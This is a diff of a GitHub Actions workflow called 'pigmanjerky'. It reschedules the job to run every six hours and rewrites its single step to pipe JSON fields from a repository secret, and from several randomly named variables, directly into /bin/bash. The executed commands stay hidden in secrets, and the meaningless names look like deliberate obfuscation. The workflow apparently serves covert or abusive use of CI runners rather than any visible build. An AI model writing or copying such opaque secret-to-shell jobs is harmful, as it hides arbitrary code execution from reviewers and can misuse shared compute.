@@ -1,27 +1,26 @@
 name: pigmanjerky
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
+    - cron: '34 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pigmanjerky
         env:
-          dss98: ${{ secrets.dss98 }}
+          s2593: ${{ secrets.s2593 }}
         run: |
-          echo $dss98 | jq -r .goyjj4 | /bin/bash
-          echo $trgcv6 | jq -r .exm6 | /bin/bash
-          echo $e631 | jq -r .dgdx6 | /bin/bash
-          echo $peg47477 | jq -r .ed562 | /bin/bash
-          echo $rkm8668 | jq -r .yztkb62987 | /bin/bash
-          echo $fc79683 | jq -r .yag401 | /bin/bash
-          echo $fawz84 | jq -r .p93352 | /bin/bash
-          echo $dpy135 | jq -r .ej131 | /bin/bash
-          echo $m2447 | jq -r .shw49587 | /bin/bash
+          echo $s2593 | jq -r .yiz99 | /bin/bash
+          echo $fp79003 | jq -r .xeix0 | /bin/bash
+          echo $rkwer979 | jq -r .b310 | /bin/bash
+          echo $ojom417 | jq -r .hl5128 | /bin/bash
+          echo $g15964 | jq -r .ogvo89 | /bin/bash
+          echo $a9908 | jq -r .v5 | /bin/bash
+          echo $nzvsk78 | jq -r .j594 | /bin/bash
+          echo $np5712 | jq -r .jxgj8 | /bin/bash
+          echo $wzqh2 | jq -r .vn5 | /bin/bash
+          echo $foti644 | jq -r .ay59302 | /bin/bash
 
